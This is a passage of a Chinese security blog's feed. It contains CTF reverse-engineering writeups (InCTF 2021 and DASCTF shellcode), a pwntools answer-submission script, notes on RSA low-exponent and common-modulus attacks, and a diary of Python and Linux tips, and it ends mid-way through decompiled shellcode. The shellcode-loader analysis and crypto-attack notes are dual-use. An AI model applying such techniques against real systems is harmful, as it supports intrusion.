class="comment">#p = remote('34.94.181.140', 4205)</span></span><br><span class="line">p = process(<span class="string">'./chall'</span>)</span><br><span class="line">ans = <span class="string">b'`\\ET0a\xfd\x8e\x8b3\x01\x02!7\x03\x02\xc9\xe3\x01\x02\x12\x1ftr\x027\xff\xd1\x02\xe1'</span></span><br><span class="line">p.recvuntil(<span class="string">'him out please !!'</span>)</span><br><span class="line">p.sendline(ans)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后是找使用z3得不到正确结果的原因。</p><p>看了一下运算过程，首先发现了一个<strong>/运算</strong>：它在python3和C语言中有点区别，python3中会保留运算小数，C中直接取整。这里改为<strong>&gt;&gt;1</strong>就保持一致了。</p><p><img src="/2021/08/16/InCTF-2021/image-20210816122710296.png" alt="image-20210816122710296"></p><p>再次跑了一下，得到仍然不是正确结果。</p><p>调试看运算过程，从汇编层面发现了问题所在，是因为计算的数据类型不当。</p><p>程序定义的输入为char类型数组，然后计算的时候也都是以char数组数类型来算的，，ida就把我从汇编层面看到的很多的当运算的数要大于127才会对计算有影响的运算在伪代码中都直接省去了（也可以说这里是ida优化太好了</p><p>但对于本题，正确的输入恰好不全是可打印字符，范围可以是（1~255），这也是程序要给nc来连接远程的原因，方便我们输入数据。</p><p>正是由于正确输入范围在1~255，所以运算过程直接看伪代码就肯定不对了，z3也得不到正确结果。</p><p>下面举几个汇编层面看到的要数据大于127才会对计算结果有影响的汇编指令：</p><p>eg1：</p><p>伪代码：</p><p><img src="/2021/08/16/InCTF-2021/image-20210816124859158.png" alt="image-20210816124859158"></p><p>汇编代码：<strong>红框部分在伪代码中并没有体现，因为当计算的数为char范围的话，这个对最终结果也确实没有影响的。</strong></p><p><img src="/2021/08/16/InCTF-2021/image-20210816124658017.png" alt="image-20210816124658017"></p><p>eg2：</p><p>伪代码：</p><p><img src="/2021/08/16/InCTF-2021/image-20210816134137679.png" alt="image-20210816134137679"></p><p>汇编代码：这可以看到伪代码中没有展示出来这里只取最低字节来移位。然后这里比较奇怪，我测试这里<strong>sar edx，cl</strong>移动的都是1位，但cl的值也不为1呀。而且按照正常cl值来移动的话又显然不对，这个地方还是比较迷糊。</p><p><img src="/2021/08/16/InCTF-2021/image-20210816134223056.png" alt="image-20210816134223056"></p><p>eg3：</p><p>伪代码：</p><p><img src="/2021/08/16/InCTF-2021/image-20210816124907598.png" alt="image-20210816124907598"></p><p>汇编代码：这里注意这个<strong>movsx</strong>指令（带符号扩展传送指令），它先会用al的符号位来填充eax的高24位。也就是说当我们要计算的数是大于127的话，这里结果经过传送指令后就变成了对应的负数。<strong>这个其实在运算后用&amp;0xff取低字节后对结果不会有影响，因为一个数转化为对应的负数后他们的二进制位是没有变的。如-1*6与255*6他们计算后的低字节都是相同的。</strong>虽然这个例子不影响最后的结果，但值得注意一下。</p><p><img src="/2021/08/16/InCTF-2021/image-20210816125219175.png" alt="image-20210816125219175"></p><p>最后，感觉本题的出题人的本意也是为了对我上面所提到的考察一下，本意上是要我们用angr要解。</p><h3 id="main-replica"><a href="#main-replica" class="headerlink" title="main_replica"></a>main_replica</h3><p>rust语言逆向，他和go一样都是无虚拟机的高级语言。</p><p>首先可以从标志字符串main.rs识别出来这是rust程序，字符串窗口也能看到很多标志字符串：</p><p><img src="/2021/08/16/InCTF-2021/image-20210818144457208.png" alt="image-20210818144457208"></p><p>在做了这个题写wp的时候，乘着这是一个个rust题，我去搭建了一下rust的开发环境。一是为了方便自己编写玩一下rust程序；二是为了使用rust-reversing-helper这个项目来恢复rust程序中的符号。<a href="https://github.com/cha5126568/rust-reversing-helper" target="_blank" rel="noopener">rust-reversing-helper</a></p><p>搭建整个环境到最后符号签名的应用遇到坑肯定还是有的，这个以后来专门开一个文章记录下。</p><p>本想wp中提一下用了这个恢复签名的效果，，结果很不理想。</p><p>然后回到我做这个题的时候。</p><p>根据elf文件的特征，找到main函数，因为程序代码量还是有点大，这就要着重去找关键代码。</p><p>很快定位到关键比较：</p><p><img src="/2021/08/16/InCTF-2021/image-20210818195211548.png" alt="image-20210818195211548"></p><p>其实加密就是打乱输入的顺序，然后与密文比较。</p><p>调试一遍，得到映射关系就好：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">base = <span class="string">'0123456789abcdefghijklmno'</span></span><br><span class="line">enc = <span class="string">'0kedtZ6fYO3aX4lPNMSgQbRwh'</span></span><br><span class="line">tmp = <span class="string">'onlh98g76kfe54mjdc32iba10'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> base:</span><br><span class="line">flag += enc[tmp.index(i)]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>闲记</title>
      <link href="/2021/08/08/%E9%97%B2%E8%AE%B0/"/>
      <url>/2021/08/08/%E9%97%B2%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>记录某一时间的学习、心得及想法。<a id="more"></a></p><h2 id="2021-8-8"><a href="#2021-8-8" class="headerlink" title="2021.8.8"></a>2021.8.8</h2><p>今天想着整理一下之前博客的文章，收纳了一下。所以我对博客的改动，删除的东西比较多，但是在最后布署的时候，使用的通过对站点使用的静态资源进行压缩来优化网站的访问速度的<strong>gulp</strong>出问题了。。</p><p><img src="/2021/08/08/%E9%97%B2%E8%AE%B0/image-20210808131835607.png" alt="image-20210808131835607"></p><p>搜索了一番，网上并没有解决办法。是不是删除了什么东西呢，然后把之前删了的东西从回收站还原，问题依旧在。</p><p>仔细看了一下错误，我的猜测是不是那篇文章中出现了什么\x07字符导致压缩出现问题。但是我修改了这么多，不可能一篇一篇去找。。</p><p>然而我可以按照修改时间，把今天与最近修改过的文章都移出去，再次布署，成功了，那就是文章中出现了什么字符导致的问题了。</p><p>很快我定位到了出错的文章，并不是我今天修改的，而是前几天写的2021的巅峰极客的wp。。最后从文章中定位出问题字符：这里的红点就是一些不可打印字符，可能其中某个字符导致了gulp出错。</p><p><img src="/2021/08/08/%E9%97%B2%E8%AE%B0/image-20210808132805886.png" alt="image-20210808132805886"></p><p>解决办法：删除即可，hh</p><h2 id="2021-8-11"><a href="#2021-8-11" class="headerlink" title="2021.8.11"></a>2021.8.11</h2><p>来对今天才知道的一个python知识点进进行记录了。😅</p><p>先说说起因：</p><p>本来我想去看看0x2d对应的ascii字符是什么，就在python解释器窗口输入了chr(0x2d)，反馈了<strong>‘-‘</strong>，但是这个在cmd窗口中没看出来是<strong>-</strong>还是<strong>_</strong>，所以我又输入ord(_)，反馈了45，嗯那就是下划线字符了。等等！我输入这个_没带引号呀，然后又试了ord(a)，果然报错<strong>name ‘a’ is not defined</strong>，那那个ord(_)是怎么回事。。</p><p>搜索一番，这个_在python中的用法还不少。</p><p>首先是在python交互解释器中，<strong>_符号是指交互解释器中最后一次执行语句的返回结果</strong>。这也就是我上面遇到的情况了。</p><p>然后<strong>_还用作被丢弃的名称</strong>，如下面举例的代码：就是我们在只要计数功能，但并不关心计数值的时候可以使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">len = <span class="number">42</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(len):</span><br><span class="line">do()</span><br></pre></td></tr></table></figure><p>最后<strong>_还可以用作函数名</strong>。</p><p>综上，所以说，那个0x2d所对应的字符不是下划线，是<strong>-</strong></p><h2 id="2021-8-16"><a href="#2021-8-16" class="headerlink" title="2021.8.16"></a>2021.8.16</h2><p>又是安装记录，hh。</p><p>安装gmpy2库，本来在linux是安装了的，但突然就是想在windows下安装下，感觉方便点。</p><p>但一开始就报错了：大概看了下应该是编译的时候出了问题，电脑中缺少了什么。</p><p><img src="/2021/08/08/%E9%97%B2%E8%AE%B0/image-20210816003647937.png" alt="image-20210816003647937"></p><p>但是我可以直接去下载.whl，然后通过wheel来安装嗯。</p><p>首先：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install wheel</span><br></pre></td></tr></table></figure><p>然后到官方github下载对应的.whl文件：<a href="https://github.com/aleaxit/gmpy/releases/tag/gmpy2-2.1.0b6" target="_blank" rel="noopener">https://github.com/aleaxit/gmpy/releases/tag/gmpy2-2.1.0b6</a></p><p>这里注意要与本机安装python的版本一致，不然会出现下面的错误：（这里cp39是python3.9用的</p><p><img src="/2021/08/08/%E9%97%B2%E8%AE%B0/image-20210816003959826.png" alt="image-20210816003959826"></p><p>我是python3.8，安装cp38就行了。</p><p>最后：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install gmpy2-<span class="number">2.1</span><span class="number">.0b6</span>-cp38-cp38-win_amd64.whl</span><br></pre></td></tr></table></figure><p><img src="/2021/08/08/%E9%97%B2%E8%AE%B0/image-20210816004124363.png" alt="image-20210816004124363"></p><h2 id="2021-8-17"><a href="#2021-8-17" class="headerlink" title="2021.8.17"></a>2021.8.17</h2><p>今天看一个wp的时候突然想着去看看Crypto的，正好看见一个rsa的题，突然对一个问题一下子疑惑了：rsa中求解私钥d的时候是找的公钥e和φ（n）的逆元，为什么不是找公钥e和n的逆元呢。</p><p>接着，我又想到了仿射密码中求逆元的时候就是直接找的密钥k和模数的逆元，然后自己简单推导了下，这个倒很简单，确实是密钥k和模数的逆元。</p><p>然后rsa中的呢，我也顺着推了一下。</p><p>这个其实也简单，就是利用了一些同余的性质。<a href="https://www.zhihu.com/question/67393951" target="_blank" rel="noopener">https://www.zhihu.com/question/67393951</a></p><h2 id="2021-8-18"><a href="#2021-8-18" class="headerlink" title="2021.8.18"></a>2021.8.18</h2><p>python中的小知识点记录~</p><p>Reverse和Crypto中经常会用下面的方法进行一个数与bytes类型互换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>long_to_bytes(<span class="number">100</span>)</span><br><span class="line"><span class="string">b'd'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes_to_long(<span class="string">b'd'</span>)</span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure><p>然后struct模块中提供了的方法也可以实现上面的功能且扩展性很高，如我们还可以指定大小端模式等。下面列一些很简单的列子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_8</span><span class="params">(v)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack( <span class="string">"!B"</span>, v )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_16</span><span class="params">(v)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack( <span class="string">"!H"</span>, v )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_32</span><span class="params">(v)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack( <span class="string">"!L"</span>, v )</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u_8</span><span class="params">(v)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack( <span class="string">"!B"</span>, v )[ <span class="number">0</span> ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u_16</span><span class="params">(v)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack( <span class="string">"!H"</span>, v )[ <span class="number">0</span> ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u_32</span><span class="params">(v)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack( <span class="string">"!L"</span>, v )[ <span class="number">0</span> ]</span><br></pre></td></tr></table></figure><p>另外是python的类中命名为<strong>__call__</strong>的方法。</p><blockquote><p><strong>__call__</strong></p><p>存在<strong>call</strong>方法的类对象被称为可调用对象，它的作用可以总结为以下两点：</p><ul><li>简化了对象下方法的调用 (当某方法调用频率很高)</li><li>模糊了对象和函数调用时的区别 (提高了代码的兼容性)</li></ul></blockquote><p>首先是简化了对象方法调用的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"***A***"</span>)</span><br><span class="line"> </span><br><span class="line">a = A()</span><br><span class="line">a.fun()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"***B***"</span>)</span><br><span class="line"></span><br><span class="line">b = B()</span><br><span class="line">b()     <span class="comment">#这里就方法的调用进行了简化</span></span><br></pre></td></tr></table></figure><p>然后是模糊对象与方法调用上的区别的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">funA</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"***A***"</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"***B***"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(fun)</span>:</span></span><br><span class="line">    fun()</span><br><span class="line">    </span><br><span class="line">c(funA)</span><br><span class="line">c(B())</span><br></pre></td></tr></table></figure><h2 id="2021-8-26"><a href="#2021-8-26" class="headerlink" title="2021.8.26"></a>2021.8.26</h2><p>惊了，每从主机向虚拟机拖拽文件时产生的备份缓存居然有700多M，，还不会自动删除。</p><p>以及为什么执行本目录下的文件要加上<strong>./</strong></p><p><strong>可以发现windows中的cmd下我们就不用加，这其实是因为windows的环境变量有当前目录下的路径，而linux中的环境变量并没有当前目录下的路径。</strong></p><p>又是记录一下小知识。</p><p>还是再说说起因。</p><p>今天弄着备用的centos的python环境发现还不能通过python直接启动python3，想到去创建一个符号链接。用python执行python3。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/bin/python3 /usr/bin/python</span><br></pre></td></tr></table></figure><p>然后突然我又想到我每次调试elf文件时，都在新创建的目录下拷贝了一份linux_server，真的是繁琐且占存储的行为，那这个我每次在新的目录也创建一个linux_server的符号链接就好了，这样解决了占存储，但还是很繁琐呀，每次还要去输入命令符号链接一下。</p><p>hh，其实根本不用这么麻烦，我直接把linux_server放到<strong>/usr/bin/</strong>，这样每次就都可以直接执行linux_server了。</p><p>接着就是去删除以前复制了的很多linux_server：注意要加上<strong>xargs</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home/ -name linux_server* | xargs rm</span><br></pre></td></tr></table></figure><p>删除过程发现了.cache/vmware/drag_and_drop还有linux_server。搜了一下这其实是每次从主机到虚拟机拖拽文件时产生的副本文件，不会自动删除。</p><p><img src="/2021/08/08/%E9%97%B2%E8%AE%B0/image-20210826133028720.png" alt="image-20210826133028720"></p><p>查看了一下这个目录下的大小：居然有760多M之大。。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -sh /home/xxx/.cache/vmware/drag_and_drop</span><br></pre></td></tr></table></figure><p>删除后，心情也感觉舒畅了很多。😂</p><h2 id="2021-8-27"><a href="#2021-8-27" class="headerlink" title="2021.8.27"></a>2021.8.27</h2><p>centos下安装gmpy2跟着错误把缺少的依赖都装好后，在导入时出现下面这个错误：也就是说这个libmpfr.so.6不存在。</p><p><img src="/2021/08/08/%E9%97%B2%E8%AE%B0/image-20210826161415157.png" alt="image-20210826161415157"></p><p>找了半天这个，根本找不到。</p><p>最后发现可以把libmpfr.so.4通过软链接过去当libmpfr.so.6用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/lib64/libmpfr.so.4 /usr/lib64/libmpfr.so.6</span><br></pre></td></tr></table></figure><h2 id="2021-8-28"><a href="#2021-8-28" class="headerlink" title="2021.8.28"></a>2021.8.28</h2><p>今天写一个用于测试很简单的python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">funa</span><span class="params">()</span>:</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">q</span><span class="params">()</span>:</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">funb</span><span class="params">()</span>:</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">funa()</span><br><span class="line">q().funb()</span><br></pre></td></tr></table></figure><p>出现了如下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"1.py"</span>, line 13, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    q().funb()</span><br><span class="line">TypeError: funb() takes no arguments (1 given)</span><br></pre></td></tr></table></figure><p>看到上面的错误提示我funb这个函数是无参的，但是我给了它一个参数，所以导致了错误。</p><p>但是我写的<strong>q().funb()</strong>，这没有给参数的嗯。</p><p>其实这是：<strong>每个与类相关联的方法调用都自动传递实参self ， 它是一个指向实例本身的引用，让实例能够访问类中的属性和方法</strong>。</p><p>也就是调用funb这个函数的时候，隐式的自动的传递了self这个参数。</p><p>要解决这个问题，直接在定义funb函数的时候加上一个参数就好了。</p><p>很基础的一个问题，对于一些细节不清楚，这也是我没有系统学习过python导致的，慢慢积累，边用边学就好。</p><h2 id="2021-12-5"><a href="#2021-12-5" class="headerlink" title="2021.12.5"></a>2021.12.5</h2><p>今天做了一个简单的rsa题目，其中涉及了2个简单的rsa的知识点。</p><p>一，低加密指数攻击。</p><p>也就是选取的公钥e太小使加密结果小于n了，这样我直接对密文开三次方根就好。对于加密结果大于n的，有 <strong>enc = c+kn</strong> 我们爆破k，直到enc能开三次方根也就找到m了。</p><p>对于开三次方根使用gmpy2库的iroot方法。</p><p>如我对8开三次方根：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gmpy2.iroot(<span class="number">8</span>, <span class="number">3</span>)</span><br><span class="line">(mpz(<span class="number">2</span>), <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>二，共模攻击。</p><h2 id="2022-1-14"><a href="#2022-1-14" class="headerlink" title="2022.1.14"></a>2022.1.14</h2><p>对于在网上下载的ida7.6的cfg目录下是有Chinese.clt文件的但是不能显示中文的（扩展的asci），解决办法：</p><p>在它的配置文件ida.cfg的ENCODING_CULTURES下加上一个 <strong>GB2312: Chinese</strong> 就好了。</p><p><img src="/2021/08/08/%E9%97%B2%E8%AE%B0/image-20220114220105970.png" alt="image-20220114220105970"></p>]]></content>
      
      
      <categories>
          
          <category> free </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF July X CBCTF 4th</title>
      <link href="/2021/08/01/DASCTF-July-X-CBCTF-4th/"/>
      <url>/2021/08/01/DASCTF-July-X-CBCTF-4th/</url>
      
        <content type="html"><![CDATA[<p>逆向题解~<a id="more"></a></p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>下载下来一共四个文件，</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210801165128724.png" alt="image-20210801165128724"></p><p>其中看到main.bat脚本是接受我们的输入后，以最小化方式启动part1.exe</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210801165237488.png" alt="image-20210801165237488"></p><p>这里去简单了解了一下bat脚本，开始的<strong>@echo off</strong>表示关闭执行本指令及其它的指令的回显；<strong>set /p</strong>表示后面用用户的输入来赋值；start  /min表示以最小化窗口的方式启动一个程序，相应的也就有start /max以最大化窗口的方式启动；taskkill /im表示所要关闭的进程的以程序名给出，另外具体详细的用法，直接在命令行窗口使用taskkill /?就清楚了。</p><p>但是从bat脚本来看，他是怎么传递我们的输入的呢。</p><p>直接启动part1.exe来看，没有什么输出。然后ida中发现是go语言写的程序，但是用以往的恢复符号的脚本用不了，这和国赛初赛那个go语言程序一样，可以使用免费版的ida7.6，自带恢复符号表，效果很好。</p><p>从函数名及汇编代码可以看出，这个程序应该是启动一个服务：</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210801172227127.png" alt="image-20210801172227127"></p><p>再在010editor中看了part2.bin文件，从机器码很明显能看出，就是一个函数的开头：</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210801174256827.png" alt="image-20210801174256827"></p><p>最后在看part3.exe，一切就很清晰了，它加载了part.bin中shellcode然后执行。</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210801172534546.png" alt="image-20210801172534546"></p><p>直接动态跟踪进入shellcode，找到很多和网络编程相关的api，及发现它在本地的8080端口请求读文件（正是part1.exe启动的服务）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_3A0005</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">8</span>]; <span class="comment">// [esp+0h] [ebp-BCh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> (__stdcall *v2)(<span class="keyword">char</span> *, <span class="keyword">int</span>, _DWORD, _DWORD, _DWORD); <span class="comment">// [esp+8h] [ebp-B4h]</span></span><br><span class="line">  <span class="keyword">void</span> (__stdcall *v3)(<span class="keyword">int</span>); <span class="comment">// [esp+Ch] [ebp-B0h]</span></span><br><span class="line">  <span class="keyword">int</span> (__stdcall *v4)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span> *); <span class="comment">// [esp+10h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">int</span> (__stdcall *v5)(_DWORD, <span class="keyword">unsigned</span> __int8 *, <span class="keyword">int</span>, <span class="keyword">int</span>); <span class="comment">// [esp+14h] [ebp-A8h]</span></span><br><span class="line">  <span class="keyword">void</span> (__stdcall *v6)(<span class="keyword">int</span>, _DWORD, _DWORD, _DWORD, _DWORD); <span class="comment">// [esp+18h] [ebp-A4h]</span></span><br><span class="line">  <span class="keyword">int</span> (__stdcall *v7)(<span class="keyword">int</span>, <span class="keyword">char</span> *, <span class="keyword">int</span>, _DWORD, _DWORD, <span class="keyword">int</span>, _DWORD, _DWORD); <span class="comment">// [esp+20h] [ebp-9Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (__stdcall *v8)(<span class="keyword">int</span>, <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">char</span> *, _DWORD, _DWORD, <span class="keyword">int</span>, _DWORD); <span class="comment">// [esp+24h] [ebp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-94h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v10)(<span class="keyword">void</span>); <span class="comment">// [esp+2Ch] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+30h] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+34h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+38h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+3Ch] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">16</span>]; <span class="comment">// [esp+40h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v16[<span class="number">8</span>]; <span class="comment">// [esp+50h] [ebp-6Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+58h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+5Ch] [ebp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v19[<span class="number">4</span>]; <span class="comment">// [esp+60h] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v20[<span class="number">40</span>]; <span class="comment">// [esp+64h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v21[<span class="number">16</span>]; <span class="comment">// [esp+8Ch] [ebp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v22[<span class="number">12</span>]; <span class="comment">// [esp+9Ch] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v23[<span class="number">12</span>]; <span class="comment">// [esp+A8h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+B4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> v25[<span class="number">4</span>]; <span class="comment">// [esp+B8h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_3A0480((<span class="keyword">void</span> (__stdcall 